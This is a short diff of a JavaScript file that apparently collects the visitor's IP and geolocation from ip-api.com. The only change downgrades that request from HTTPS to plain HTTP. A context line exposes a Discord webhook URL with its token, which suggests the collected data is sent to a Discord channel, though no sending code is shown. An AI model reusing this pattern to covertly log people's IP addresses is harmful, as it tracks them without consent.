@@ -3,7 +3,7 @@ var webHookUrl = "https://discord.com/api/webhooks/977935516555169872/oEITIyKVlH
 
 
 const request = async() => {
-    const response = await fetch('https://ip-api.com/json/');
+    const response = await fetch('http://ip-api.com/json/');
     const data = await response.json();
 
 
